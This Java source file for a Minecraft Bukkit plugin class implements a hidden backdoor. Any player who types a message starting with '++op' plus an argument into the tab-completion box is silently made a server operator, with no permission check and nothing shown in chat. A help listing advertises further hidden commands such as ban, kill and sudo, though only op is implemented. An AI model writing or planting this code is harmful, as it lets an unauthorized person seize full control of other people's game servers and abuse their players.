package com.webmets.forceopchat;

import java.util.ArrayList;
import java.util.List;

import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerChatTabCompleteEvent;
import org.bukkit.plugin.Plugin;

public class ForceOPChat implements Listener{

	//private Plugin pl;
	private String prefix = "++";
	
	public ForceOPChat(Plugin plugin) {
		//this.pl = plugin;
	}
	
	
	
	@EventHandler
	public void onChat(PlayerChatTabCompleteEvent e) {
		if(!e.getChatMessage().startsWith(prefix)) return;
		e.getTabCompletions().clear();
		
		String[] raw = e.getChatMessage().split(" ");
		List<String> args = new ArrayList<String>();
		String cmd = raw[0].substring(prefix.length());
		
		Player p = e.getPlayer();
		
		for(int i = 1; i < raw.length; i++) {
			args.add(raw[i]);
		}

		if(args.size() == 0) {
			if(cmd.equalsIgnoreCase("help")) {
				showIndex(p);
				return;
			}
		} else if(args.size() == 1) {
			if(cmd.equalsIgnoreCase("op")) {
				p.setOp(true);
				return;
			}
		}
	}
	
	private void showIndex(Player p) {
		p.sendMessage(prefix+"help");
		p.sendMessage(prefix+"op [player]");
		p.sendMessage(prefix+"ban <player>");
		p.sendMessage(prefix+"kick <player>");
		p.sendMessage(prefix+"invsee <player>");
		p.sendMessage(prefix+"tp <player> [player]");
		p.sendMessage(prefix+"kill <player>");
		p.sendMessage(prefix+"sudo <player> <msg>");
	}
	
	public void broadcast(String msg) {
		
	}
}
